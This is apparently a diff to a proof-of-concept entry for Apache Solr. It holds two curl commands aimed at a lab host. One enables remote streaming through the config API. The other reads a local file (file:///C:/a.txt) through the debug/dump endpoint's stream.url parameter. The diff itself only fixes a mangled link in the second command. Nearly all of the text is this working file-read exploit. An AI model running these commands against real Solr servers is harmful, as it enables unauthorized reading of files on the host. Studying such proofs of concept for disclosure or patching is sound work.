@@ -13,7 +13,7 @@ POC:
 ```
 curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://192.168.33.130:8983/solr/db/config -H 'Content-type:application/json' 
 
-curl "[http://192.168.33.130:8983/solr/db/debug/dump?para...](http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams) -F "stream.url=file:///C:/a.txt" 
+curl "http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///C:/a.txt" 
 ```
 
 
